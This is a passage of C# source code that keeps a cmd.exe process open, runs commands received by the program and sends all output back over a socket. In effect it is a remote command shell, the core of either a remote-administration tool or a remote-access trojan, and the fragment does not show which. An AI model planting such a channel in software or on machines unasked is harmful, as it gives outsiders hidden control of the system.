    if (cmdProcess == null || cmdProcess.HasExited)
    {
        var psi2 = new ProcessStartInfo("cmd.exe", "/k " + command);
        psi2.RedirectStandardOutput = true;
        psi2.RedirectStandardInput = true;
        psi2.RedirectStandardError = true;
        psi2.UseShellExecute = false;
        psi2.WorkingDirectory = Path.GetPathRoot(Environment.SystemDirectory);
        cmdProcess = new Process();
        cmdProcess.StartInfo = psi2;
        cmdProcess.EnableRaisingEvents = true;
        cmdProcess.OutputDataReceived += async (object sender, DataReceivedEventArgs args) =>
        {
            jsonMessage.Status = "ok";
            jsonMessage.Output = args.Data;
            await SocketSend(jsonMessage);
        };
        cmdProcess.ErrorDataReceived += async (object sender, DataReceivedEventArgs args) =>
        {
            jsonMessage.Status = "ok";
            jsonMessage.Output = args.Data;
            await SocketSend(jsonMessage);
        };
        cmdProcess.Start();
        cmdProcess.BeginOutputReadLine();
        cmdProcess.BeginErrorReadLine();
    }
    else
    {
        cmdProcess.StandardInput.WriteLine(command);
    }
